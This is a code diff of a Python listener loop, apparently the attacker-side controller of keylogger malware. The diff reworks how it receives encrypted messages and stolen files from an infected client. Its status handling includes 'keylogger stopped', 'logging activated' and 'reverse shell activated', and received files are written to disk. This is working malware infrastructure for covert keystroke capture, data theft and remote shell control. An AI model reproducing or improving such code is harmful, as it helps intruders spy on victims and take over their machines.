@@ -42,35 +42,45 @@ while True:
 
             recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
             if recv:
-                msg = recv.decode(utils.ENCODING)
+                header = recv.decode(utils.ENCODING).split("__")
+                print("header", header)
 
-                if msg.startswith("file__"):
-                    filename, length = msg.split("__")[1:3]
-                    
-                    print("Receiving File:", filename, "length:", length)
+                if len(header) == 2: # If len is 2, the header contains a filename. In this case its a file and will be handled as one
+                    filename, chunk_size = header[0], int(header[1])
+                    print("Receiving File:", filename, "chunk_size:", chunk_size)
+
                     data = b""
-                    while recv != "done sending file".encode(utils.ENCODING):
+                    for i in range(chunk_size):
                         recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
                         if recv:
                             data += recv
                     print("Data received")
                     utils.convert_bytes_to_file(data=data, filename=filename, path=".")
-                    
-                elif msg == "keylogger stopped":
-                    print("keylogger stopped. good bye!")
-                    break
-                elif msg == "logging activated":
-                    print("logging activated")
-                elif msg == "logging deactivated":
-                    print("logging deactivated")
-                elif msg == "reverse shell activated":
-                    reverse_shell_active = True
-                elif msg == "reverse shell deactivated":
-                    reverse_shell_active = False
-                elif msg == "received":
-                    pass
-                else:
-                    print(msg)
+
+                elif len(header) == 1: # If len is 1, the header just contains chunk_size and thus will not be converted to a file.
+                    chunk_size = int(header[0])
+                    msg = b""
+                    for i in range(chunk_size):
+                        recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
+                        if recv:
+                            msg += recv
+                    msg = msg.decode(utils.ENCODING)
+                        
+                    if msg == "keylogger stopped":
+                        print("keylogger stopped. good bye!")
+                        break
+                    elif msg == "logging activated":
+                        print("logging activated")
+                    elif msg == "logging deactivated":
+                        print("logging deactivated")
+                    elif msg == "reverse shell activated":
+                        reverse_shell_active = True
+                    elif msg == "reverse shell deactivated":
+                        reverse_shell_active = False
+                    elif msg == "received":
+                        pass
+                    else:
+                        print(msg)
 
 conn.close()
 print("Connection closed.")
